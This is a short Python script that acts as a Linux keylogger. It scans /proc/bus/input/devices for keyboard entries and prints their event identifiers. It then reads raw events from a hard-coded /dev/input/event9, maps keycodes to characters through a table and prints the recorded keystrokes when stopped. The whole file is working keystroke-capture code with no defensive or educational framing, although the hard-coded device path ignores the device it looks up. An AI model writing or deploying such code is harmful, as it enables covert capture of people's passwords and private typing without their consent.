import struct

# Translation Table
table = {
        2:"1",
        3:"2",
        4:"3",
        5:"4",
        6:"5",
        7:"6",
        8:"7",
        9:"8",
        10:"9",
        11:"0",
        12:"-",
        13:"=",
        14:"\b",
        15:"\t",
        16:"q",
        17:"w",
        18:"e",
        19:"r",
        20:"t",
        21:"y",
        22:"u",
        23:"i",
        24:"o",
        25:"p",
        26:"{",
        27:"}",
        28:"\n",
        29:"'LCTRL'",
        30:"a",
        31:"s",
        32:"d",
        33:"f",
        34:"g",
        35:"h",
        36:"j",
        37:"k",
        38:"l",
        39:";",
        40:"'",
        41:"",
        42:"'LSHIFT'",
        43:"\\",
        44:"z",
        45:"x",
        46:"c",
        47:"v",
        48:"b",
        49:"n", 
        50:"m",
        51:",",
        52:".",
        53:"/",
        57:" "
}


# Open the /proc/bus/input/devices file and find the correct eventX file
# to read from.

entries = []
lines = []
with open("/proc/bus/input/devices", "r") as f:
    lines = f.readlines()

index = 0
targets = []
for line in lines:
    if "keyboard" in line or "Keyboard" in line:
        targets.append(lines[index+4])
    index += 1

for t in targets:
    pieces = t.split(" ")
    event_identifier = ""
    for x in pieces:
        if "event" in x:
            event_identifier = x
            break
    print(event_identifier)

bytes_payload = ""
try:
    with open("/dev/input/event9", "rb") as f:
        while True:
            data = f.read(24)
            event = struct.unpack('4IHHI', data)
            type = event[4]
            value = event[6]
            keycode = event[5]
            if value == 1:
                bytes_payload += table[keycode]
except KeyboardInterrupt:
    print("Done.")
    print(bytes_payload)

